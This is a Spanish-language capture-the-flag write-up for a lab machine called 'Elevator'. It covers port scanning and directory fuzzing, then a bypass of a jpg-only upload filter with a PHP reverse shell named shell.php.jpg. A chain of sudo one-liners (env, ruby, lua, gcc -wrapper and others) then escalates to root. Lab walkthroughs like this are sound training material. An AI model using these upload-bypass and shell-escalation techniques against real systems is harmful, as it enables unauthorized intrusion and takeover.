
# Elevator
![image](https://github.com/user-attachments/assets/94e48dad-afd1-4617-9218-7f59701415d5)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```
Como tenemos abierto el puerto 80, vamos a visitar la web a ver si encontramos algo que nos pueda ayudar pero no hay nada relevante así que hacemos fuzzing para encontrar nuevas rutas.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php
```
![image](https://github.com/user-attachments/assets/bd15383a-3374-4318-b93d-c976cb398283)

Como no encontramos nada, seguimos buscando en directorios en este caso vamos al directorio **http://172.17.0.2/themes/**

![image](https://github.com/user-attachments/assets/0f497aa0-9c13-4687-a06d-44425ca59927)


## Explotación.

Encontramos una ruta **http://172.17.0.2/themes/archivo.html**, y encontramos una página para subir archivos. Nos indica que únicamente se pueden subir archivos *jpg*.

![image](https://github.com/user-attachments/assets/ce863652-ac2a-44dd-be7f-0c0b560d18ee)

Para saltarnos esa comprobación podemos subir una shell en php que tenga como extensión jpg. Es decir, sería *shell.php.jpg* Para ello vamos a [GitHub](https://github.com/pentestmonkey/php-reverse-shell) y utilizamos su reverse shell en php.

![image](https://github.com/user-attachments/assets/83c89a3b-94f7-4f55-92be-e6435c594ea0)

![image](https://github.com/user-attachments/assets/e93f87e5-9673-431f-9025-cc0d0ec15b12)

Nos ponemos en escucha en el puerto que hayamos configurado, en mi caso el 4444 y vamos a la ruta que nos muestra.

![image](https://github.com/user-attachments/assets/69e9ddc2-8b9c-42dc-b3c1-9b8dfd706ead)

## Escaladad de privilegios.

Ahora comprobamos los permisos sudo que tenemos y vemos que podemos ejecutar como **daphne** */usr/bin/evn*

![image](https://github.com/user-attachments/assets/1719d5ac-1ced-4f05-a376-08cfbeb15164)

```bash
sudo -u daphne /usr/bin/env /bin/sh
```
![image](https://github.com/user-attachments/assets/c6d6a982-e070-48df-b936-9e4bf483951d)

![image](https://github.com/user-attachments/assets/5313f360-4a38-4787-805b-fdc328e45ac9)

```bash
sudo -u vilma /usr/bin/ash
```
![image](https://github.com/user-attachments/assets/595b5be4-d24b-447c-9cc5-f51cca2e2665)

```bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
```
![image](https://github.com/user-attachments/assets/1dee18d8-7bc6-4699-8b61-8f53a11179be)

```bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
```
![image](https://github.com/user-attachments/assets/07f5fb76-616f-49c3-83f0-9be336555625)

```bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
```
![image](https://github.com/user-attachments/assets/9f81a2e6-401e-4e9c-9732-cfcc1fd0bdfe)

```bash
sudo -u root /usr/bin/sudo /bin/sh
```

![image](https://github.com/user-attachments/assets/afcb909f-242b-42e7-a958-92d505d5c7b8)

Ya tenemos acceso como **root**.













